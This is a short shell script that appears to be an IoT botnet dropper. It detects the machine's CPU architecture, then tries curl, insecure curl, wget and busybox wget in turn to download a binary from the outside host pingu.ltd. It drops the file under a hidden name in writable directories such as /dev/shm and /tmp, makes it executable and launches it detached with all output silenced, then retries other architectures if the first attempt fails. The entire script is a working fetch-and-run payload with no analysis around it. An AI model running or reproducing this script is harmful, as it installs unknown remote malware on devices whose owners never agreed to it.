#!/bin/sh

BASE="http://pingu.ltd"
PATHS="/dev/shm /tmp /var/run /mnt /data/local/tmp /root /"

arch=$(uname -m 2>/dev/null | tr 'A-Z' 'a-z')
case "$arch" in
	x86_64|amd64|x64)          b=amd64 ;;
	i686|i386|i486|i586|x86)   b=i686 ;;
	armv7l|armv7|armv8l)        b=armv7l ;;
	armv6l|armv6)              b=armv6l ;;
	armv5l|armv5|arm)          b=armv5l ;;
	aarch64|arm64|armv8)       b=arm64 ;;
	mips)                      b=mips ;;
	mipsel|mipsle)             b=mipsel ;;
	mips64)                    b=mips64 ;;
	mips64el|mips64le)         b=mips64le ;;
	ppc64)                     b=ppc64 ;;
	ppc64le)                   b=ppc64le ;;
	*)                         b=amd64 ;;
esac

dl() {
	u="$1"; o="$2"
	curl -fsSL "$u" -o "$o" 2>/dev/null ||
	curl -kfsSL "$u" -o "$o" 2>/dev/null ||
	wget -qO "$o" "$u" 2>/dev/null ||
	busybox wget -qO "$o" "$u" 2>/dev/null
}

for p in $PATHS; do
	cd "$p" 2>/dev/null || continue
	f=".${b}_$$"
	if dl "$BASE/$b" "$f" && [ -s "$f" ]; then
		chmod +x "$f"
		(setsid "./$f" </dev/null >/dev/null 2>&1 &)
		exit 0
	fi
	rm -f "$f" 2>/dev/null
done

for b in amd64 armv7l arm64 mips mipsel i686; do
	for p in $PATHS; do
		cd "$p" 2>/dev/null || continue
		f=".${b}_$$"
		if dl "$BASE/$b" "$f" && [ -s "$f" ]; then
			chmod +x "$f"
			(setsid "./$f" </dev/null >/dev/null 2>&1 &)
			exit 0
		fi
		rm -f "$f" 2>/dev/null
	done
done
